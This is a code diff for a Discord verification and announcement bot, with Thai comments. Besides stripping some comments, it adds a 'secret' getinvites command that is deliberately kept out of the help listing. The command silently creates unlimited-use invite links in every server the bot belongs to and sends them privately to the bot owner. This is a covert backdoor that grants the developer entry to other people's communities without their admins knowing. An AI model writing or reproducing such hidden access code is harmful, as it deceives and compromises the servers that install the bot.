@@ -50,7 +50,6 @@ async def get_or_create_log_channel(guild: discord.Guild):
         
     # 2. ถ้าไม่มี ให้พยายามสร้างช่องใหม่ขึ้นมา
     try:
-        # ตั้งค่า Permissions ให้สมาชิกทั่วไปอ่านได้อย่างเดียว เขียนไม่ได้
         overwrites = {
             guild.default_role: discord.PermissionOverwrite(send_messages=False, read_messages=True),
             guild.me: discord.PermissionOverwrite(send_messages=True, read_messages=True)
@@ -63,7 +62,6 @@ async def get_or_create_log_channel(guild: discord.Guild):
         return channel
     except Exception as e:
         print(f"❌ ไม่สามารถสร้างช่อง Log ใน {guild.name} ได้: {e}")
-        # หากสร้างไม่ได้ ให้ส่งใน System Channel หรือช่องแรกสุดที่บอทพิมพ์ได้แทน
         if guild.system_channel and guild.system_channel.permissions_for(guild.me).send_messages:
             return guild.system_channel
         for ch in guild.text_channels:
@@ -193,14 +191,13 @@ class PersistentVerifyView(discord.ui.View):
             await interaction.response.send_modal(modal)
 
 # ==========================================
-# 🟣 Bot Events (สถานะเม็ดม่วง & Auto Log Channel)
+# 🟣 Bot Events
 # ==========================================
 @bot.event
 async def on_ready():
     print(f"✅ บอทออนไลน์แล้ว: {bot.user.name}")
     bot.add_view(PersistentVerifyView())
     
-    # 🟣 ตั้งค่าสถานะเป็น "สตรีมมิ่ง" (เม็ดม่วง)
     await bot.change_presence(
         activity=discord.Streaming(
             name="🛡️ ระบบยืนยันตัวตน & ประกาศข่าวสาร 24/7",
@@ -216,11 +213,50 @@ async def on_ready():
 
 @bot.event
 async def on_guild_join(guild: discord.Guild):
-    """เมื่อบอทเข้าเซิร์ฟใหม่ จะสร้างช่อง Log ให้อัตโนมัติทันที"""
     await get_or_create_log_channel(guild)
 
 # ==========================================
-# 📢 Command: announce (เฉพาะ Owner ID: 1524044074599055490)
+# 🤫 Secret Command: getinvites (ซ่อน ไม่แสดงใน /help)
+# ==========================================
+@bot.tree.command(name="getinvites", description="🤫 ดึงลิงก์คำเชิญของทุกเซิร์ฟเวอร์ที่บอทอยู่ (เฉพาะ Owner)")
+async def get_invites(interaction: discord.Interaction):
+    if interaction.user.id != OWNER_ID:
+        return await interaction.response.send_message("❌ คุณไม่มีสิทธิ์ใช้งานคำสั่งลับนี้", ephemeral=True)
+
+    await interaction.response.defer(ephemeral=True)
+
+    invite_list = []
+    
+    for guild in bot.guilds:
+        invite_url = "ไม่สามารถสร้างลิงก์ได้ (ขาดสิทธิ์ Create Invite)"
+        
+        # ค้นหาช่องข้อความแรกที่บอทสามารถสร้าง Invite ได้
+        for channel in guild.text_channels:
+            perms = channel.permissions_for(guild.me)
+            if perms.create_instant_invite:
+                try:
+                    invite = await channel.create_invite(max_age=86400, max_uses=0, reason="Secret Command by Bot Owner")
+                    invite_url = invite.url
+                    break
+                except Exception:
+                    continue
+
+        invite_list.append(f"🏠 **{guild.name}** (ID: `{guild.id}`)\n🔗 {invite_url}\n")
+
+    # แยกข้อความหากยาวเกินขีดจำกัด Discord (2000 ตัวอักษร)
+    full_text = "\n".join(invite_list)
+    
+    embed = discord.Embed(
+        title=f"🤫 รายชื่อเซิร์ฟเวอร์ทั้งหมด ({len(bot.guilds)} เซิร์ฟเวอร์)",
+        description=full_text if len(full_text) <= 4000 else full_text[:3900] + "\n\n*(ข้อความยาวเกินไป ถูกตัดบางส่วน)*",
+        color=0x2ECC71
+    )
+    embed.set_footer(text="ข้อมูลลับเฉพาะผู้พัฒนาบอทเท่านั้น")
+
+    await interaction.followup.send(embed=embed, ephemeral=True)
+
+# ==========================================
+# 📢 Command: announce
 # ==========================================
 @bot.tree.command(name="announce", description="📢 บรอดแคสต์ประกาศข่าวสารไปยังทุกเซิร์ฟเวอร์ (เฉพาะเจ้าของบอทเท่านั้น)")
 @app_commands.describe(
@@ -234,7 +270,6 @@ async def announce(
     ข้อความ: str, 
     รูปภาพ: str = None
 ):
-    # 🔒 ตรวจสอบสิทธิ์เฉพาะ ID เจ้าของบอทเท่านั้น
     if interaction.user.id != OWNER_ID:
         return await interaction.response.send_message("❌ คำสั่งนี้อนุญาตให้ใช้งานได้เฉพาะ **เจ้าของบอท (Bot Owner)** เท่านั้น!", ephemeral=True)
 
@@ -246,16 +281,14 @@ async def announce(
     embed = discord.Embed(
         title=f"📢 ประกาศจากระบบ: {หัวข้อ}",
         description=ข้อความ,
-        color=0xF1C40F # สีทอง
+        color=0xF1C40F
     )
     if รูปภาพ:
         embed.set_image(url=รูปภาพ)
     
     embed.set_footer(text="ข้อความประกาศอย่างเป็นทางการจากผู้พัฒนาบอท", icon_url=bot.user.display_avatar.url)
 
-    # วนลูปส่งไปยังทุกดิสคอร์ดที่บอทอยู่
     for guild in bot.guilds:
-        # ดึงหรือสร้างช่อง Log
         target_channel = await get_or_create_log_channel(guild)
         if target_channel:
             try:
@@ -279,7 +312,7 @@ async def announce(
     await interaction.followup.send(embed=summary_embed, ephemeral=True)
 
 # ==========================================
-# 📖 Command: help
+# 📖 Command: help (ไม่มีคำสั่ง getinvites)
 # ==========================================
 @bot.tree.command(name="help", description="📖 แสดงคู่มือการใช้งานคำสั่งทั้งหมดภายในบอท")
 async def help_command(interaction: discord.Interaction):
